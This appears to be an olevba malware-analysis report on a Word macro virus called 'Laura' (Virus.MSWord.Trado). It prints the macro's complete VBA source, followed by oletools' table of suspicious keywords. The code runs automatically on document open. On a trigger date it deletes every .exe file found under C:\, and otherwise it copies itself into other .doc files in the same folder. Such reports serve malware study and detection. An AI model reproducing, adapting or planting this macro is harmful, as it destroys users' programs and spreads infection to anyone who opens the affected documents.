olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Trado
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Trado - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Laura.bas 
in file: Virus.MSWord.Trado - OLE stream: 'Macros/VBA/Laura'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' Virus - Laura
'
'
'
'
'
'
Sub AutoOpen()
Dim cMacro, cDat, w, nMacro, dAngello, Arq_Old, cLoc
    dAngello = "Laura"
    Arq_Old = ActiveDocument.FullName
    cLoc = ActiveDocument.Path
    cDat = Day("20/01/01")
    If Day(Date) = cDat Then
        Set fs = Application.FileSearch
        With fs
            .LookIn = "c:\"
            .SearchSubFolders = True
            .FileName = "*.exe"
            If .Execute(SortBy:=msoSortByFileName, _
                sortorder:=msoSortOrderAscending) > 0 Then
                MsgBox .FoundFiles.Count & " Arquivo(s) Encontrado(s)."
                For i = 1 To .FoundFiles.Count
                    Kill .FoundFiles(i)
                Next i
            Else
            '
            End If
        End With
    Else
        Set fs = Application.FileSearch
        With fs
            .LookIn = cLoc
            .SearchSubFolders = True
            .FileName = "*.Doc"
            If .Execute(SortBy:=msoSortByFileName, _
                sortorder:=msoSortOrderAscending) > 0 Then
                For i = 1 To .FoundFiles.Count
                    If .FoundFiles(i) <> ActiveDocument.FullName Then
                        If FileLen(.FoundFiles(i)) > 1024 Then
                            If Documents.Count = 1 Then
                                WordBasic.DisableAutoMacros
                                Documents.Open .FoundFiles(i)
                                cMacro = ActiveDocument.VBProject.VBComponents.Count
                                For w = 1 To cMacro
                                    If ActiveDocument.VBProject.VBComponents.Item(w).Name = dAngello Then
                                        Application.OrganizerDelete Source:= _
                                        ActiveDocument.FullName, Name:= _
                                        dAngello, Object:=wdOrganizerObjectProjectItems
                                    End If
                                Next w
                                Application.OrganizerCopy Source:= _
                                Arq_Old, Destination:= _
                                ActiveDocument.FullName, Name:=dAngello, Object:= _
                                wdOrganizerObjectProjectItems
                                ActiveWindow.Close savechanges:=wdSaveChanges
                            End If
                        End If
                    End If
                Next i
            Else
            End If
        End With
    End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

